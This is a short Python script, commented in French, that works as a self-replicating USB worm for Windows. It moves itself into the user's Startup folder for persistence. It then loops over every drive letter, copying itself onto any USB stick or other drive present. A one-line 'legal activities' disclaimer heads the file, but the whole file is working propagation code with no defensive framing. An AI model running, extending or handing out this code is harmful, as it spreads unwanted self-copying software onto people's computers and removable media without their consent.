# created by J-A2b , USE for LEGAL ACTIVITIES
import wmi
import time
import os
import shutil
import sys

def move_to_startup():
    # Obtenir le chemin du dossier de démarrage
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Obtenir le chemin du script en cours d'exécution
    script_path = os.path.abspath(sys.argv[0])

    # Définir le chemin de destination dans le dossier de démarrage
    destination_path = os.path.join(startup_folder, os.path.basename(script_path))

    # Vérifier si le script est déjà dans le dossier de démarrage
    if script_path.lower() == destination_path.lower():
        print("Le script est déjà dans le dossier de démarrage.")
    else:
        try:
            # Déplacer le script vers le dossier de démarrage
            shutil.move(script_path, destination_path)
            print(f"Le script a été déplacé vers le dossier de démarrage : {destination_path}")
        except Exception as e:
            print(f"Erreur lors du déplacement du script : {e}")


def monitor_usb():
    # Initialisation de la connexion WMI
    c = wmi.WMI()

    # Création d'un dictionnaire pour stocker les périphériques déjà détectés
    detected_devices = {}

    while True:
        # Requête pour récupérer tous les périphériques de stockage amovibles
        query = "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"
        usb_devices = c.query(query)

        for device in usb_devices:
            device_id = device.DeviceID
            if device_id not in detected_devices:
                # Nouveau périphérique détecté
                print("CLEF branchée")
                

# Spécifiez le nom du fichier que vous souhaitez créer (le script lui-même)
        nom_script = os.path.abspath(sys.argv[0])
# Chemin complet du fichier (répertoire + nom de fichier)
        chemin_script = os.path.join(os.path.abspath(os.path.dirname(__file__)), nom_script)
# Copiez le script vers les clés USB connectées
        lettres_disques = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        lettres_disponibles = [drive + ':' for drive in lettres_disques if os.path.exists(drive + ':')]

        for cle_usb in lettres_disponibles:
            destination = os.path.join(cle_usb, nom_script)

    # Assurez-vous que le script n'est pas déjà sur la clé USB
            if not os.path.exists(destination):
                try:
                    shutil.copy(chemin_script, destination)
                    print(f"Le script a été copié avec succès sur {cle_usb}.")
                except Exception as e:
                    print(f"Erreur lors de la copie du script sur {cle_usb}: {e}")
            else:
                print(f"Le script est déjà présent sur {cle_usb}.")

if __name__ == "__main__":
    print("Attente de branchement de la clé USB...")
    move_to_startup()
    monitor_usb()

